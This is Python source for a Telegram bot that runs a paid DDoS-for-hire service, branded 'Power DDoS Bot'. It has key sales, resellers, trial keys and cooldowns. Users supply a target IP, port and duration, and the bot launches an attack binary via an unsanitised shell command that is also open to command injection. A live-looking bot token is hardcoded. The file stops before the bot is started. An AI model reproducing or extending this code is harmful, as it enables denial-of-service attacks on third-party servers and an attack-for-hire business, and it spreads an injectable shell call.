import os
import time
import logging
import asyncio
from telegram import Update, ReplyKeyboardMarkup, InlineKeyboardMarkup, InlineKeyboardButton
from telegram.ext import Application, CommandHandler, MessageHandler, filters, CallbackContext, ConversationHandler
from telegram.helpers import escape_markdown
from telegram.ext import (
    Application,
    CommandHandler,
    MessageHandler,
    filters,
    CallbackContext,
    ConversationHandler,
    CallbackQueryHandler
)

# Suppress HTTP request logs
logging.getLogger("httpx").setLevel(logging.WARNING)
logging.getLogger("telegram").setLevel(logging.WARNING)

# Enhanced Logging Configuration
logging.basicConfig(
    level=logging.INFO,
    format="%(asctime)s - %(levelname)s - %(message)s",
    handlers=[
        logging.FileHandler("bot.log"),
        logging.StreamHandler()
    ]
)

# Bot Configuration
TELEGRAM_BOT_TOKEN = '7996306021:AAFfAG6nuipaA06MOvvs-nJhXO5zuG2rFEE'
OWNER_USERNAME = "rajabhai_02"
ALLOWED_GROUP_ID = -1002374071862
ALLOWED_GROUPS = {ALLOWED_GROUP_ID}
MAX_DURATION = 240  # Default max attack duration
MAX_THREADS = 50000
KEY_FILE = "keys.txt"
FEEDBACK_FOLDER = "feedback"
FEEDBACK_CHANNEL_ID = None  # Set your feedback channel ID if needed

# Create necessary folders
os.makedirs(FEEDBACK_FOLDER, exist_ok=True)

# Enhanced Key System
keys = {}  # {key: {type, duration, expiration_time, generated_by, max_devices, used_devices}}
redeemed_users = {}  # {user_id: {key, expiration_time, feedback_pending}}
redeemed_keys_info = {}  # {key: {generated_by, redeemed_by, devices_used}}

# Reseller System
resellers = set()
reseller_balances = {}

# Key Types with enhanced attributes
KEY_TYPES = {
    "TRIAL": {
        "1H": {"price": 0, "duration": 3600, "max_devices": 1, "feedback_required": False}
    },
    "REGULAR": {
        "1H": {"price": 5, "duration": 3600, "max_devices": 1, "feedback_required": True},
        "2H": {"price": 10, "duration": 7200, "max_devices": 1, "feedback_required": True},
        "1D": {"price": 60, "duration": 86400, "max_devices": 2, "feedback_required": True},
    },
    "CUSTOM": {
        "MAX-1H": {"price": 0, "duration": 3600, "max_devices": 1, "feedback_required": True},
        "MAX-2H": {"price": 0, "duration": 7200, "max_devices": 1, "feedback_required": True},
        "MAX-1D": {"price": 70, "duration": 86400, "max_devices": 1, "feedback_required": True},
        "MAX-1W": {"price": 300, "duration": 604800, "max_devices": 2, "feedback_required": True},
        "MAX-1M": {"price": 1200, "duration": 2592000, "max_devices": 2, "feedback_required": True}
    },
    "SPECIAL": {
        "VIP-1H": {"price": 10, "duration": 7200, "max_devices": 1, "feedback_required": False},
        "VIP-1D": {"price": 120, "duration": 172800, "max_devices": 1, "feedback_required": False},
        "VIP-1W": {"price": 500, "duration": 604800, "max_devices": 1, "feedback_required": False},
        "VIP-1M": {"price": 1500, "duration": 2592000, "max_devices": 1, "feedback_required": False},
    },
}

# Global Cooldown
global_cooldown = 0
last_attack_time = 0
running_attacks = {}

# Conversation States
GET_DURATION = 1
GET_KEY = 2
GET_ATTACK_ARGS = 3
GET_SET_DURATION = 4
GET_SET_THREADS = 5
GET_DELETE_KEY = 6
GET_RESELLER_ID = 7
GET_REMOVE_RESELLER_ID = 8
GET_ADD_COIN_USER_ID = 9
GET_ADD_COIN_AMOUNT = 10
GET_SET_COOLDOWN = 11
GET_KEY_TYPE = 14
GET_FEEDBACK = 15
GET_ADD_GROUP_ID = 12
GET_REMOVE_GROUP_ID = 13
GET_CUSTOM_KEY_DETAILS = 16

# Dynamic Keyboard Generation
def get_keyboard(update: Update):
    chat = update.effective_chat
    
    if chat.type == "private":
        if is_owner(update):
            return ReplyKeyboardMarkup([
                ['⚡ Attack', '🔑 Generate Key', '📊 Stats'],
                ['⚙️ Settings', '👑 Owner Tools', '📜 Rules'],
                ['🔍 Status']
            ], resize_keyboard=True)
        elif is_reseller(update):
            return ReplyKeyboardMarkup([
                ['⚡ Attack', '🔑 Generate Key', '💳 Balance'],
                ['📜 Rules', '🔍 Status']
            ], resize_keyboard=True)
        else:
            # Regular users in private chat only get these options
            return ReplyKeyboardMarkup([
                ['⚡ Attack', '🔍 Status'],
                ['📜 Rules']
            ], resize_keyboard=True)
    else:
        # Group chat keyboard
        return ReplyKeyboardMarkup([
            ['⚡ Attack', '🔑 Redeem Key'],
            ['📜 Rules', '🔍 Status', '📤 Feedback', '📤 Submit Feedback']
        ], resize_keyboard=True)

# Key Management Functions
def load_keys():
    if not os.path.exists(KEY_FILE):
        return

    with open(KEY_FILE, "r") as file:
        for line in file:
            if line.startswith("KEY:"):
                parts = line.strip().split(":")
                key_data = parts[1].split(",")
                if len(key_data) >= 7:
                    keys[key_data[0]] = {
                        "type": key_data[1],
                        "duration": int(key_data[2]),
                        "expiration_time": float(key_data[3]),
                        "generated_by": int(key_data[4]),
                        "max_devices": int(key_data[5]),
                        "used_devices": int(key_data[6])
                    }
                elif len(key_data) >= 5:  # Backward compatibility
                    keys[key_data[0]] = {
                        "type": "REGULAR",
                        "duration": int(key_data[1]),
                        "expiration_time": float(key_data[2]),
                        "generated_by": int(key_data[3]),
                        "max_devices": 1,
                        "used_devices": int(key_data[4]) if len(key_data) > 4 else 0
                    }

def save_keys():
    with open(KEY_FILE, "w") as file:
        for key, data in keys.items():
            file.write(
                f"KEY:{key},{data['type']},{data['duration']},"
                f"{data['expiration_time']},{data['generated_by']},"
                f"{data['max_devices']},{data['used_devices']}\n"
            )

# Authorization Functions
def is_allowed_group(update: Update):
    chat = update.effective_chat
    return chat.type in ['group', 'supergroup'] and chat.id in ALLOWED_GROUPS

def is_owner(update: Update):
    return update.effective_user.username == OWNER_USERNAME

def is_reseller(update: Update):
    return update.effective_user.id in resellers

def is_authorized_user(update: Update):
    return is_owner(update) or is_reseller(update)

# Command Handlers
async def start(update: Update, context: CallbackContext):
    welcome_msg = """
    🚀 *Welcome to Power DDoS Bot* 🚀
    
    🔥 *Premium Features:*
    - Advanced Attack Methods
    - Multi-Device Support
    - Real-time Monitoring
    - Reseller System
    
    📌 Use the menu buttons below to navigate!
    """
    await update.message.reply_text(
        welcome_msg,
        parse_mode='Markdown',
        reply_markup=get_keyboard(update)
    )

async def generate_key_start(update: Update, context: CallbackContext):
    if not (is_owner(update) or is_reseller(update)):
        await update.message.reply_text("❌ *Unauthorized!*", parse_mode='Markdown')
        return ConversationHandler.END

    keyboard = [
        [InlineKeyboardButton("Regular Keys", callback_data='REGULAR'),
         InlineKeyboardButton("Special Keys", callback_data='SPECIAL')],
        [InlineKeyboardButton("MAX Keys (Owner Only)", callback_data='CUSTOM')],
        [InlineKeyboardButton("Trial Keys (Owner Only)", callback_data='TRIAL')]
    ]
    await update.message.reply_text(
        "✨ *Select Key Type:*",
        reply_markup=InlineKeyboardMarkup(keyboard),
        parse_mode='Markdown'
    )
    return GET_KEY_TYPE

async def generate_key_type(update: Update, context: CallbackContext):
    query = update.callback_query
    await query.answer()
    
    key_type = query.data
    context.user_data['key_type'] = key_type
    
    # Owner check for CUSTOM and TRIAL keys
    if (key_type == "CUSTOM" or key_type == "TRIAL") and not is_owner(update):
        await query.edit_message_text("❌ *Only owner can generate these keys!*", parse_mode='Markdown')
        return ConversationHandler.END
    
    keyboard = []
    for key, details in KEY_TYPES[key_type].items():
        price_text = f" - {details['price']} coins" if details['price'] > 0 else ""
        keyboard.append([InlineKeyboardButton(
            f"{key}{price_text}", 
            callback_data=key
        )])
    
    # Owner custom key option
    if is_owner(update) and key_type == "CUSTOM":
        keyboard.append([InlineKeyboardButton("➕ Create Custom Key", callback_data="CUSTOM_KEY")])
    
    await query.edit_message_text(
        f"🔢 *Select {key_type} Key Duration:*",
        reply_markup=InlineKeyboardMarkup(keyboard),
        parse_mode='Markdown'
    )
    return GET_DURATION
    
async def generate_key_duration(update: Update, context: CallbackContext):
    query = update.callback_query
    await query.answer()
    
    duration_key = query.data
    key_type = context.user_data['key_type']
    
    # Handle custom key creation separately
    if duration_key == "CUSTOM_KEY":
        return await generate_custom_key(update, context)
    
    try:
        key_details = KEY_TYPES[key_type][duration_key]
    except KeyError:
        await query.edit_message_text(
            "❌ *Invalid key duration selected!*",
            parse_mode='Markdown'
        )
        return ConversationHandler.END
    
    # Check reseller balance
    user_id = query.from_user.id
    if is_reseller(update):
        if user_id not in reseller_balances or reseller_balances[user_id] < key_details['price']:
            await query.edit_message_text(
                f"❌ *Insufficient balance! You need {key_details['price']} coins.*",
                parse_mode='Markdown'
            )
            return ConversationHandler.END
    
    # Generate unique key
    unique_key = os.urandom(4).hex().upper()
    key = f"{OWNER_USERNAME}-{duration_key}-{unique_key}"
    
    # Calculate expiration time
    expiration_time = time.time() + key_details['duration']
    
    # Store key
    keys[key] = {
        "type": key_type,
        "duration": key_details['duration'],
        "expiration_time": expiration_time,
        "generated_by": user_id,
        "max_devices": key_details['max_devices'],
        "used_devices": 0
    }
    
    # Deduct from reseller balance
    if is_reseller(update):
        reseller_balances[user_id] -= key_details['price']
    
    save_keys()
    
    await query.edit_message_text(
        f"🔑 *{key_type} Key Generated!*\n\n"
        f"*Key:* `{key}`\n"
        f"*Duration:* {duration_key}\n"
        f"*Max Devices:* {key_details['max_devices']}\n"
        f"*Feedback Required:* {'Yes' if key_details['feedback_required'] else 'No'}",
        parse_mode='Markdown'
    )
    return ConversationHandler.END

async def generate_custom_key(update: Update, context: CallbackContext):
    query = update.callback_query
    await query.answer()
    
    if query.data == "CUSTOM_KEY":
        await query.edit_message_text(
            "🛠️ *Create Custom Key* 🛠️\n\n"
            "📌 *Format:* `<name> <hours> <days> <max_devices> <price>`\n"
            "💡 *Example:* `RAJA-1M 0 30 5 500`\n\n"
            "ℹ️ *Note:* 1M = 1 Month (30 days)",
            parse_mode='Markdown'
        )
        return GET_CUSTOM_KEY_DETAILS

async def handle_custom_key_details(update: Update, context: CallbackContext):
    try:
        parts = update.message.text.split()
        if len(parts) != 5:
            raise ValueError("Invalid format")
            
        name = parts[0]
        hours = int(parts[1])
        days = int(parts[2])
        max_devices = int(parts[3])
        price = int(parts[4])
        
        total_seconds = (days * 86400) + (hours * 3600)
        
        # Add new key to KEY_TYPES
        KEY_TYPES["CUSTOM"][name] = {
            "price": price,
            "duration": total_seconds,
            "max_devices": max_devices,
            "feedback_required": True
        }
        
        # Generate key
        unique_key = os.urandom(4).hex().upper()
        key = f"{OWNER_USERNAME}-{name}-{unique_key}"
        
        keys[key] = {
            "type": "CUSTOM",
            "duration": total_seconds,
            "expiration_time": time.time() + total_seconds,
            "generated_by": update.effective_user.id,
            "max_devices": max_devices,
            "used_devices": 0
        }
        save_keys()
        
        await update.message.reply_text(
            f"🔐 *Custom Key Created!*\n\n"
            f"*Name:* {name}\n"
            f"*Duration:* {days} days {hours} hours\n"
            f"*Max Devices:* {max_devices}\n"
            f"*Price:* {price} coins\n\n"
            f"🔑 *Key:* `{key}`",
            parse_mode='Markdown'
        )
        return ConversationHandler.END
        
    except Exception as e:
        await update.message.reply_text(
            f"❌ *Error creating custom key:* {str(e)}\n\n"
            "📌 Correct format: <name> <hours> <days> <max_devices> <price>\n"
            "💡 Example: `RAJA-1M 0 30 5 500`",
            parse_mode='Markdown'
        )
        return GET_CUSTOM_KEY_DETAILS

async def generate_trial_keys(context: CallbackContext):
    try:
        if not ALLOWED_GROUP_ID:
            return
            
        # Generate 3 trial keys
        trial_keys = []
        for _ in range(3):
            unique_key = os.urandom(4).hex().upper()
            key = f"TRIAL-1H-{unique_key}"
            expiration_time = time.time() + 3600  # 1 hour validity
            
            keys[key] = {
                "type": "TRIAL",
                "duration": 3600,
                "expiration_time": expiration_time,
                "generated_by": 0,  # 0 = system generated
                "max_devices": 1,
                "used_devices": 0
            }
            trial_keys.append(key)
        
        save_keys()
        
        # Send message to group
        message = "🎁 *FREE TRIAL KEYS* �\n\n"
        message += "🔥 *Limited Time Offer!*\n"
        message += "⏳ *Valid for 1 hour only*\n\n"
        for i, key in enumerate(trial_keys, 1):
            message += f"{i}. `{key}`\n"
        
        message += "\n📌 *How to use:*\n1. Copy a key\n2. Use /redeemkey command\n3. Start attacking!"
        
        await context.bot.send_message(
            chat_id=ALLOWED_GROUP_ID,
            text=message,
            parse_mode='Markdown'
        )
    except Exception as e:
        logging.error(f"Error generating trial keys: {e}")

async def redeem_key_start(update: Update, context: CallbackContext):
    if not is_allowed_group(update):
        await update.message.reply_text("❌ *This command can only be used in the allowed group!*", parse_mode='Markdown')
        return ConversationHandler.END

    await update.message.reply_text(
        "🔑 *Enter your key to redeem:*",
        parse_mode='Markdown'
    )
    return GET_KEY

async def redeem_key_input(update: Update, context: CallbackContext):
    key = update.message.text
    user_id = update.effective_user.id
    chat = update.effective_chat

    if key in keys and keys[key]['expiration_time'] > time.time():
        # Check device limit
        if keys[key]['used_devices'] >= keys[key]['max_devices']:
            await update.message.reply_text("❌ *Key has reached its device limit!*", parse_mode='Markdown')
            return ConversationHandler.END

        # Private chat restrictions
        if chat.type == "private" and keys[key]['type'] != "SPECIAL":
            await update.message.reply_text(
                "❌ *Only SPECIAL keys can be used in private chat!\n"
                "Please use this key in the group instead.*",
                parse_mode='Markdown'
            )
            return ConversationHandler.END

        # Update key usage
        keys[key]['used_devices'] += 1
        
        # Store redemption info
        redeemed_users[user_id] = {
            'key': key,
            'expiration_time': keys[key]['expiration_time'],
            'feedback_pending': False  # Will be set after first attack if needed
        }
        
        redeemed_keys_info[key] = {
            'generated_by': keys[key]['generated_by'],
            'redeemed_by': user_id,
            'devices_used': keys[key]['used_devices']
        }
        
        save_keys()
        
        duration_text = f"{keys[key]['duration'] // 3600} hours" if keys[key]['duration'] >= 3600 else f"{keys[key]['duration'] // 60} minutes"
        
        await update.message.reply_text(
            f"✅ *Key Activated!*\n\n"
            f"🔑 *Type:* {keys[key]['type']}\n"
            f"⏳ *Duration:* {duration_text}\n"
            f"📱 *Devices:* {keys[key]['used_devices']}/{keys[key]['max_devices']}\n\n"
            f"{'⚡ *VIP Benefits:* No feedback required' if keys[key]['type'] == 'SPECIAL' else '📸 *Feedback required after each attack*'}",
            parse_mode='Markdown'
        )
        return ConversationHandler.END
    else:
        await update.message.reply_text("❌ *Invalid or expired key!*", parse_mode='Markdown')
        return ConversationHandler.END

async def attack_start(update: Update, context: CallbackContext):
    chat = update.effective_chat
    user_id = update.effective_user.id

    # Private chat restrictions
    if chat.type == "private":
        if user_id not in redeemed_users or redeemed_users[user_id]['key'] not in keys:
            await update.message.reply_text("❌ *Only SPECIAL key users can use the bot in private chat!*", parse_mode='Markdown')
            return ConversationHandler.END
            
        key_type = keys[redeemed_users[user_id]['key']]['type']
        if key_type != "SPECIAL":
            await update.message.reply_text("❌ *Only SPECIAL key users can use the bot in private chat!*", parse_mode='Markdown')
            return ConversationHandler.END

    # Group chat restrictions
    if chat.type in ['group', 'supergroup'] and not is_allowed_group(update):
        await update.message.reply_text("❌ *This command can only be used in the allowed group!*", parse_mode='Markdown')
        return ConversationHandler.END

    # Check for active key
    if user_id not in redeemed_users:
        await update.message.reply_text("❌ *You need a valid key to attack!*", parse_mode='Markdown')
        return ConversationHandler.END

    # Check key expiration
    if redeemed_users[user_id]['expiration_time'] <= time.time():
        await update.message.reply_text("❌ *Your key has expired!*", parse_mode='Markdown')
        return ConversationHandler.END

    # Check cooldown (only for non-SPECIAL keys in groups)
    key_type = keys[redeemed_users[user_id]['key']]['type']
    if (chat.type in ['group', 'supergroup'] and 
        key_type != "SPECIAL" and 
        time.time() - last_attack_time < global_cooldown):
        remaining = int(global_cooldown - (time.time() - last_attack_time))
        await update.message.reply_text(f"⏳ *Cooldown active! Please wait {remaining} seconds.*", parse_mode='Markdown')
        return ConversationHandler.END

    # Check feedback (only for non-SPECIAL keys in groups)
    if (chat.type in ['group', 'supergroup'] and 
        key_type in ["REGULAR", "CUSTOM", "TRIAL"] and 
        redeemed_users[user_id].get('feedback_pending', False)):
        await update.message.reply_text("❌ *Please submit feedback first!*", parse_mode='Markdown')
        return ConversationHandler.END

    await update.message.reply_text(
        "⚡ *Enter attack details:*\n\n"
        "📌 Format: <ip> <port> <duration>\n"
        "💡 Example: `1.1.1.1 80 60`",
        parse_mode='Markdown'
    )
    return GET_ATTACK_ARGS

async def attack_input(update: Update, context: CallbackContext):
    global last_attack_time, running_attacks

    args = update.message.text.split()
    if len(args) != 3:
        await update.message.reply_text("❌ *Invalid format!* Use: <ip> <port> <duration>", parse_mode='Markdown')
        return ConversationHandler.END

    try:
        ip, port, duration = args[0], args[1], int(args[2])
    except ValueError:
        await update.message.reply_text("❌ *Duration must be a number!*", parse_mode='Markdown')
        return ConversationHandler.END

    user_id = update.effective_user.id
    chat = update.effective_chat
    key_data = redeemed_users.get(user_id, {})
    key_type = keys.get(key_data.get('key', ''), {}).get('type', '')

    # Set different duration limits based on chat type and key type
    if chat.type == "private" and key_type == "SPECIAL":
        max_duration = MAX_DURATION * 2  # Double duration for private SPECIAL keys
    else:
        max_duration = MAX_DURATION
        
    duration = min(duration, max_duration)

    # Update last attack time (only for group non-SPECIAL keys)
    if chat.type in ['group', 'supergroup'] and key_type != "SPECIAL":
        last_attack_time = time.time()

    # Start attack
    attack_id = f"{ip}:{port}-{time.time()}"
    running_attacks[attack_id] = {
        'user_id': user_id,
        'start_time': time.time(),
        'duration': duration
    }

    async def run_attack():
        try:
            process = await asyncio.create_subprocess_shell(
                f"./Rahul {ip} {port} {duration}",
                stdout=asyncio.subprocess.PIPE,
                stderr=asyncio.subprocess.PIPE
            )
            await process.communicate()

            if attack_id in running_attacks:
                del running_attacks[attack_id]

            # Set feedback pending for group non-SPECIAL keys
            if (chat.type in ['group', 'supergroup'] and 
                key_type in ["REGULAR", "CUSTOM", "TRIAL"]):
                redeemed_users[user_id]['feedback_pending'] = True
                save_keys()
                
                feedback_keyboard = ReplyKeyboardMarkup(
                    [['📤 Submit Feedback'], ['⚡ Attack', '🔍 Status']],
                    resize_keyboard=True
                )
                
                await update.message.reply_text(
                    f"✅ *Attack Completed!*\n\n"
                    f"📸 *Please send screenshot feedback to continue!*",
                    parse_mode='Markdown',
                    reply_markup=feedback_keyboard
                )
            else:
                await update.message.reply_text(
                    f"✅ *Attack Completed!*",
                    parse_mode='Markdown',
                    reply_markup=get_keyboard(update)
                )
        except Exception as e:
            logging.error(f"Attack error: {e}")
            await update.message.reply_text("❌ *Attack failed!*", parse_mode='Markdown')

    asyncio.create_task(run_attack())

    await update.message.reply_text(
        f"🔥 *Attack Launched!*\n\n"
        f"🎯 *Target:* `{ip}:{port}`\n"
        f"⏳ *Duration:* {duration} seconds",
        parse_mode='Markdown'
    )
    return ConversationHandler.END

async def handle_feedback(update: Update, context: CallbackContext):
    user_id = update.effective_user.id
    chat = update.effective_chat
    
    if user_id not in redeemed_users:
        await update.message.reply_text("❌ *No active key found!*", parse_mode='Markdown')
        return ConversationHandler.END
    
    # Only accept feedback for REGULAR, CUSTOM, and TRIAL keys in groups
    key = redeemed_users[user_id].get('key')
    if (chat.type == "private" or 
        key not in keys or 
        keys[key]['type'] not in ["REGULAR", "CUSTOM", "TRIAL"]):
        await update.message.reply_text("ℹ️ *No feedback required for your key type.*", parse_mode='Markdown')
        return ConversationHandler.END
    
    if not redeemed_users[user_id].get('feedback_pending', False):
        await update.message.reply_text("ℹ️ *No feedback required at this time.*", parse_mode='Markdown')
        return ConversationHandler.END
    
    if update.message.photo:
        # Get the highest resolution photo
        photo = update.message.photo[-1]
        photo_file = await photo.get_file()
        
        # Save feedback to folder
        timestamp = int(time.time())
        feedback_filename = f"{FEEDBACK_FOLDER}/{user_id}_{timestamp}.jpg"
        await photo_file.download_to_drive(feedback_filename)
        
        # Forward to feedback channel if configured
        if FEEDBACK_CHANNEL_ID:
            try:
                await context.bot.send_photo(
                    chat_id=FEEDBACK_CHANNEL_ID,
                    photo=photo_file.file_id,
                    caption=f"Feedback from user {user_id} for key {key}"
                )
            except Exception as e:
                logging.error(f"Failed to forward feedback: {e}")

        # Mark feedback as received
        redeemed_users[user_id]['feedback_pending'] = False
        save_keys()
        
        await update.message.reply_text(
            "✅ *Feedback received! Thank you!*\n\n"
            "⚡ *You can now launch another attack!*",
            parse_mode='Markdown',
            reply_markup=get_keyboard(update)
        )
        return ConversationHandler.END
    else:
        await update.message.reply_text(
            "❌ *Please send a screenshot as photo!*\n\n"
            "📸 How to submit feedback:\n"
            "1. Take screenshot of attack results\n"
            "2. Send it here as photo (not as file)",
            parse_mode='Markdown'
        )
        return GET_FEEDBACK

async def check_key_status(update: Update, context: CallbackContext):
    user_id = update.effective_user.id
    user_name = update.effective_user.full_name
    current_time = time.time()

    if user_id in redeemed_users:
        key_data = redeemed_users[user_id]
        key_info = keys.get(key_data['key'], {})
        
        if key_data['expiration_time'] > current_time:
            remaining_time = key_data['expiration_time'] - current_time
            hours = int(remaining_time // 3600)
            minutes = int((remaining_time % 3600) // 60)
            
            status_message = (
                f"🔍 *Key Status*\n\n"
                f"👤 *User:* {escape_markdown(user_name, version=2)}\n"
                f"🆔 *ID:* `{user_id}`\n"
                f"🔑 *Key:* `{escape_markdown(key_data['key'], version=2)}`\n"
                f"📱 *Devices:* {key_info.get('used_devices', 1)}/{key_info.get('max_devices', 1)}\n"
                f"⏳ *Status:* {'🟢 Running' if not key_data['feedback_pending'] else '🟡 Pending Feedback'}\n"
                f"🕒 *Remaining Time:* {hours}h {minutes}m\n\n"
                f"{'📸 *Feedback Required!*' if key_data['feedback_pending'] else '⚡ *Premium Access Active!*'}"
            )
        else:
            status_message = (
                f"🔍 *Key Status*\n\n"
                f"👤 *User:* {escape_markdown(user_name, version=2)}\n"
                f"🆔 *ID:* `{user_id}`\n"
                f"🔑 *Key:* `{escape_markdown(key_data['key'], version=2)}`\n"
                f"⏳ *Status:* 🔴 Expired\n\n"
                f"❌ *Your key has expired. Redeem a new key to continue.*"
            )
    else:
        status_message = (
            f"🔍 *Key Status*\n\n"
            f"👤 *User:* {escape_markdown(user_name, version=2)}\n"
            f"🆔 *ID:* `{user_id}`\n\n"
            f"❌ *No active key found!*\n"
            f"ℹ️ *Use the Redeem Key button to activate your access.*"
        )

    await update.message.reply_text(status_message, parse_mode='Markdown')

async def balance(update: Update, context: CallbackContext):
    if not is_reseller(update):
        await update.message.reply_text("❌ *Only resellers can check balance!*", parse_mode='Markdown')
        return

    user_id = update.effective_user.id
    balance = reseller_balances.get(user_id, 0)
    
    await update.message.reply_text(
        f"💰 *Reseller Balance*\n\n"
        f"👤 *User:* {update.effective_user.full_name}\n"
        f"🆔 *ID:* `{user_id}`\n"
        f"💎 *Balance:* {balance} coins",
        parse_mode='Markdown'
    )

async def rules(update: Update, context: CallbackContext):
    rules_text = """
    📜 *Rules & Guidelines* 📜

    1️⃣ *Key Usage:*
    - Each key has device limits
    - Regular keys require feedback
    - No key sharing allowed

    2️⃣ *Attacks:*
    - Follow cooldown periods
    - Respect duration limits
    - No illegal targets

    3️⃣ *Conduct:*
    - No spamming commands
    - Be respectful to others
    - Follow admin instructions

    ⚠️ *Violations will result in bans without refund!*
    """
    await update.message.reply_text(rules_text, parse_mode='Markdown')

async def show_keys(update: Update, context: CallbackContext):
    if not (is_owner(update) or is_reseller(update)):
        await update.message.reply_text("❌ *Unauthorized!*", parse_mode='Markdown')
        return

    current_time = time.time()
    active_keys = []
    redeemed_keys = []
    expired_keys = []

    for key, key_info in keys.items():
        if key_info['expiration_time'] > current_time:
            remaining_time = key_info['expiration_time'] - current_time
            hours = int(remaining_time // 3600)
            minutes = int((remaining_time % 3600) // 60)
            
            try:
                generated_by = await context.bot.get_chat(key_info['generated_by'])
                generated_by_name = f"@{generated_by.username}" if generated_by.username else generated_by.full_name
            except:
                generated_by_name = "Unknown"
            
            active_keys.append(
                f"🔹 `{escape_markdown(key, version=2)}`\n"
                f"   ⏳ {hours}h {minutes}m | 📱 {key_info['used_devices']}/{key_info['max_devices']}\n"
                f"   👤 {escape_markdown(generated_by_name, version=2)} | 🏷️ {key_info['type']}"
            )
        else:
            expired_keys.append(f"🔹 `{escape_markdown(key, version=2)}` (Expired)")

    for key, key_info in redeemed_keys_info.items():
        if key_info['redeemed_by'] in redeemed_users:
            try:
                redeemed_by = await context.bot.get_chat(key_info['redeemed_by'])
                redeemed_by_name = f"@{redeemed_by.username}" if redeemed_by.username else redeemed_by.full_name
                generated_by = await context.bot.get_chat(key_info['generated_by'])
                generated_by_name = f"@{generated_by.username}" if generated_by.username else generated_by.full_name
            except:
                redeemed_by_name = "Unknown"
                generated_by_name = "Unknown"
            
            redeemed_keys.append(
                f"🔸 `{escape_markdown(key, version=2)}`\n"
                f"   👤 {escape_markdown(redeemed_by_name, version=2)}\n"
                f"   🛒 {escape_markdown(generated_by_name, version=2)}"
            )

    message = "*🗝️ Active Keys:*\n" + ("\n\n".join(active_keys) if active_keys else "No active keys") + "\n\n"
    message += "*🔑 Redeemed Keys:*\n" + ("\n\n".join(redeemed_keys) if redeemed_keys else "No redeemed keys") + "\n\n"
    message += "*⌛ Expired Keys:*\n" + ("\n".join(expired_keys) if expired_keys else "No expired keys")

    await update.message.reply_text(message, parse_mode='Markdown')

async def cancel_conversation(update: Update, context: CallbackContext):
    await update.message.reply_text(
        "❌ *Operation cancelled.*",
        parse_mode='Markdown',
        reply_markup=get_keyboard(update)
    )
    return ConversationHandler.END

async def request_feedback(update: Update, context: CallbackContext):
    user_id = update.effective_user.id
    chat = update.effective_chat
    
    if (user_id in redeemed_users and 
        redeemed_users[user_id].get('feedback_pending', False) and
        redeemed_users[user_id].get('key') in keys and
        chat.type in ['group', 'supergroup'] and
        keys[redeemed_users[user_id]['key']]['type'] in ["REGULAR", "CUSTOM", "TRIAL"]):
        await update.message.reply_text(
            "📸 *Please send screenshot feedback:*\n\n"
            "1. Take screenshot of attack results\n"
            "2. Send it here as photo\n\n"
            "⚠️ *Required to continue using the bot!*",
            parse_mode='Markdown'
        )
        return GET_FEEDBACK
    else:
        await update.message.reply_text(
            "ℹ️ *No feedback required at this time.*",
            parse_mode='Markdown'
        )
        return ConversationHandler.END

async def handle_button_click(update: Update, context: CallbackContext):
    query = update.message.text

    if query == '⚡ Attack':
        await attack_start(update, context)
    elif query == '🔑 Generate Key':
        await generate_key_start(update, context)
    elif query == '🔑 Redeem Key':
        await redeem_key_start(update, context)
    elif query == '📊 Stats':
        await show_keys(update, context)
    elif query == '⚙️ Settings':
        await update.message.reply_text(
            "⚙️ *Settings Menu*\n\n"
            "Use commands to adjust settings:\n"
            "/setduration - Change max attack duration\n"
            "/setthreads - Change max threads\n"
            "/setcooldown - Change global cooldown",
            parse_mode='Markdown'
        )
    elif query == '👑 Owner Tools':
        if is_owner(update):
            await update.message.reply_text(
                "👑 *Owner Tools*\n\n"
                "/addreseller - Add new reseller\n"
                "/removereseller - Remove reseller\n"
                "/addcoin - Add coins to reseller\n"
                "/addgroup - Add allowed group\n"
                "/removegroup - Remove allowed group",
                parse_mode='Markdown'
            )
        else:
            await update.message.reply_text("❌ *Owner only!*", parse_mode='Markdown')
    elif query == '📜 Rules':
        await rules(update, context)
    elif query == '🔍 Status':
        await check_key_status(update, context)
    elif query == '💳 Balance':
        await balance(update, context)
    elif query == '📤 Feedback' or query == '📤 Submit Feedback':
        await request_feedback(update, context)

async def check_expired_keys(context: CallbackContext):
    current_time = time.time()
    expired_users = []
    
    # Check user keys
    for user_id, data in list(redeemed_users.items()):
        if data['expiration_time'] <= current_time:
            expired_users.append(user_id)
            del redeemed_users[user_id]
    
    # Check keys themselves
    for key, data in list(keys.items()):
        if data['expiration_time'] <= current_time:
            del keys[key]
    
    # Cleanup redeemed keys info
    for key, data in list(redeemed_keys_info.items()):
        if data['redeemed_by'] in expired_users:
            del redeemed_keys_info[key]
    
    if expired_users:
        save_keys()
        logging.info(f"Cleaned up expired keys for users: {expired_users}")

def main():
    load_keys()

    application = Application.builder().token(TELEGRAM_BOT_TOKEN).build()
    
    # Schedule jobs
    application.job_queue.run_repeating(check_expired_keys, interval=300, first=0)
    application.job_queue.run_repeating(generate_trial_keys, interval=1800, first=0)

    # Conversation Handlers
    generate_key_handler = ConversationHandler(
        entry_points=[
            CommandHandler("generatekey", generate_key_start),
            MessageHandler(filters.Text(["🔑 Generate Key"]), generate_key_start)
        ],
        states={
            GET_KEY_TYPE: [CallbackQueryHandler(generate_key_type)],
            GET_DURATION: [CallbackQueryHandler(generate_key_duration)],
            GET_CUSTOM_KEY_DETAILS: [MessageHandler(filters.TEXT & ~filters.COMMAND, handle_custom_key_details)]
        },
        fallbacks=[CommandHandler("cancel", cancel_conversation)],
    )

    redeem_key_handler = ConversationHandler(
        entry_points=[
            CommandHandler("redeemkey", redeem_key_start),
            MessageHandler(filters.Text(["🔑 Redeem Key"]), redeem_key_start)
        ],
        states={
            GET_KEY: [MessageHandler(filters.TEXT & ~filters.COMMAND, redeem_key_input)],
        },
        fallbacks=[CommandHandler("cancel", cancel_conversation)],
    )

    attack_handler = ConversationHandler(
        entry_points=[
            CommandHandler("attack", attack_start),
            MessageHandler(filters.Text(["⚡ Attack"]), attack_start)
        ],
        states={
            GET_ATTACK_ARGS: [MessageHandler(filters.TEXT & ~filters.COMMAND, attack_input)],
        },
        fallbacks=[CommandHandler("cancel", cancel_conversation)],
    )

    feedback_handler = ConversationHandler(
        entry_points=[
            MessageHandler(filters.Text(["📤 Feedback", "📤 Submit Feedback"]), request_feedback)
        ],
        states={
            GET_FEEDBACK: [MessageHandler(filters.PHOTO | filters.TEXT, handle_feedback)],
        },
        fallbacks=[CommandHandler("cancel", cancel_conversation)],
    )
    
    # Add all handlers
    application.add_handler(generate_key_handler)
    application.add_handler(redeem_key_handler)
    application.add_handler(attack_handler)
    application.add_handler(feedback_handler)
    
    # Add command handlers
    application.add_handler(CommandHandler("start", start))
    application.add_handler(CommandHandler("balance", balance))
    application.add_handler(CommandHandler("rules", rules))
